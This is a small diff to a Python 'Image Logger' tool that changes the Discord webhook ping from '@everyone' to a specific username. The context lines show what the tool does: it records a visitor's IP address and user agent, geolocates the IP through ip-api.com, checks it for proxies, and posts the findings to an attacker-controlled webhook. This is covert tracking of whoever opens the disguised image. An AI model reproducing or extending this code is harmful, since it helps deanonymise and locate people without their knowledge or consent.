@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "@whimsical_kiwi_11016",
     "embeds": [
         {
             "title": "Image Logger - Error",
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "@whimsical_kiwi_11016 "
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
